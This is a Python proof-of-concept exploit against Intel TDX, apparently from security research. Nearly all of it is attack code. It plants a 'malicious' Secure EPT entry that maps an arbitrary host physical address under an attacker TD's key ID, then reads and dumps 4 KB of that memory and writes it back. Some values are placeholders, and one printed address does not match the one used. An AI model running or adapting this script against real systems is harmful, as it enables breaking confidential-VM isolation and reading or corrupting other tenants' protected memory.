import ctypes
import sys
from argparse import ArgumentParser
from gateway import Gateway, FOUR_KILOBYTES
from tdxtend import Tdxtend, INVALID_PID, TdxStatus, TdxErrorCode
from tdxamine import State
import os
import signal
import struct


HKID_MASK = 0xFC00000000000
HKID_START_BIT = 52 - 6

# Standard Colors (Dimmer)
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
MAGENTA = "\033[35m"
CYAN    = "\033[36m"

# Bright/Bold Versions (Often better for headers)
BRIGHT_RED   = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_WHITE = "\033[97m"
GREY         = "\033[90m"
RESET        = "\033[00m"

def print_success(msg):
  print(f"{BRIGHT_GREEN}[+] {msg}{RESET}")

def print_error(msg):
  print(f"{BRIGHT_RED}[-] {msg}{RESET}")

def print_warning(msg):
  print(f"{YELLOW}[*] {msg}{RESET}")

def print_info(msg):
  print(f"{GREY}    {msg}{RESET}")

def read_td_bytes(tdxtend, tdr_pa, start_gpa, size=64):
  full_data = b""
  
  for i in range(0, size, 8):
    current_gpa = start_gpa + i
    rax, _, _, r8 = tdxtend.call_tdh_mem_rd(tdr_pa, current_gpa)
    
    # Should not fail, we checked this before
    if rax == TdxErrorCode.TDX_SUCCESS.value:
      full_data += struct.pack("<Q", r8)
    else:
      print_error(f"Read failed at GPA {hex(current_gpa)} with error {hex(rax)}")
      return None

  return full_data

def write_td_bytes(tdxtend, tdr_pa, start_gpa, data):
  
  for i in range(0, len(data), 8):
    current_val = struct.unpack("<Q", data[i:i+8])[0]
    current_gpa = start_gpa + i
    rax, _, _, r8 = tdxtend.call_tdh_mem_wr(tdr_pa, current_gpa, current_val)
    
    # Should not fail, we checked this before
    if rax != TdxErrorCode.TDX_SUCCESS.value:
      print_error(f"Write failed at GPA {hex(current_gpa)} with error {hex(rax)}")
      return None

def print_hexdump(data):
  for i in range(0, len(data), 16):
    chunk = data[i:i+16]
    
    hex_values = " ".join(f"{b:02x}" for b in chunk)
    # Add extra padding if the last line is short
    if len(chunk) < 16:
      hex_values += "   " * (16 - len(chunk))
    
    ascii_repr = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
    
    print(f"{hex_values}  |{ascii_repr}|")


def decode_l1_secure_ept_entry(entry: int):
  """
  Decodes and prints the fields of a 64-bit L1 Secure EPT Entry 
  based on Intel TDX specifications.
  """
  
  # Define the layout: (Full Name, LSB, Size in bits)
  # Note: "Ignored" fields (bits 11, 59, 62) are deliberately skipped.
  fields = [
    ("Read", 0, 1),
    ("Write", 1, 1),
    ("Execute", 2, 1),
    ("Memory Type", 3, 3),
    ("Ignore PAT", 6, 1),
    ("Leaf", 7, 1),
    ("Accessed", 8, 1),
    ("Dirty", 9, 1),
    ("Execute User", 10, 1),
    ("Host Physical Address", 12, 40),
    ("Verify Guest Paging", 57, 1),
    ("Paging-Write Access", 58, 1),
    ("Supervisor Shadow Stack", 60, 1),
    ("Check Sub-Page Permissions", 61, 1),
    ("Suppress #VE", 63, 1),
  ]

  for name, lsb, size in fields:
    # Create a mask of 'size' bits of 1s (e.g., size 3 -> 0b111)
    mask = (1 << size) - 1
    
    # Shift the target bits to the 0th position and apply the mask
    value = (entry >> lsb) & mask
    
    # Format the output based on whether it's a single bit or a larger field
    if size == 1:
      print_info(f"- {name:<35}: {value}")
    else:
      print_info(f"- {name:<35}: 0x{value:X}")

def add_sept_entry(tdxtend, tdr_pa, gpa, target_hpa, level):
  print(f"[*] Creating level {level} SEPT entry for GPA={gpa:#x}")

  rc, rcx, rdx, r8 = tdxtend.call_tdh_mem_sept_add(tdr_pa, gpa, level, target_hpa, True)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error(f"Error while calling TDH.MEM.SEPT.ADD on level {level}")
    print_error(f"  RAX: {rc:#x}")
    print_error(f"  RCX: {rcx:#x}")
    print_error(f"  RDX: {rdx:#x}")
    print_error(f"  R8:  {r8:#x}")
    return False
  else:
    if r8 == 0xFFFFFFFFFFFFFFFF:
      print_info(f"Successfully added level {level} SEPT entry")
    elif (r8 >> 63) & 1 == 1:
      print_info(f"Level {level} SEPT entry for given GPA already exists")
    else:
      print_error("This should not be reached...")
      print_error(f"  RCX: {rcx:#x}")
      print_error(f"  RDX: {rdx:#x}")
      print_error(f"  R8:  {r8:#x}")
  return True

def setup_sept(tdxtend, tdr, target_pa, hkid):
  ATTR_SVE = 1 << 63
  malicious_sept_pa = target_pa | (hkid << HKID_START_BIT)
  flags = ATTR_SVE | 0x4f7
  malicious_sept_entry = malicious_sept_pa | flags
  malicious_sept_entry = struct.pack("<Q", malicious_sept_entry)
  write_td_bytes(tdxtend, tdr, 0x1666000000, malicious_sept_entry)
  rc = tdxtend.call_tdh_mem_track(tdr)

  if rc != TdxErrorCode.TDX_SUCCESS.value:
    print_error("Error while calling TDH.MEM.TRACK")
    return False

def main():
  with open("/tmp/tdx-vm-3.pid", 'r') as f:
    pid_attacker_2 = int(f.read().strip())

  # TODO: Set HPA to read here
  HPA_TO_READ = 0x0000000

  gateway = Gateway()
  tdxtend = Tdxtend(INVALID_PID, gateway)

  tdr_pa_attacker2 = gateway.get_tdr_pa(pid_attacker_2)
  tdcs_pa_attacker2 = gateway.get_tdcs_pa(pid_attacker_2)

  hkid_attacker_2 = 0x23  # TODO: gateway.get_hkid()

  # 0x1666000000 --> Maps to SEPT entry for 0x1555000000
  # 0x1555000000 --> Reading this reads the memory

  setup_sept(tdxtend, tdr_pa_attacker2, HPA_TO_READ, hkid_attacker_2)
  
  print(f"[*] Attempting to read from 0x155000000:")
  data = read_td_bytes(tdxtend, tdr_pa_attacker2, 0x1555000000, size=4096)
  print_hexdump(data)

  input("Press enter to continue")

  # Writing the captured data back to HPA_TO_READ
  print(f"[*] Attempting to write to 0x155000000:")
  write_td_bytes(tdxtend, tdr_pa_attacker2, 0x1555000000, data)

if __name__ == "__main__":
  main()
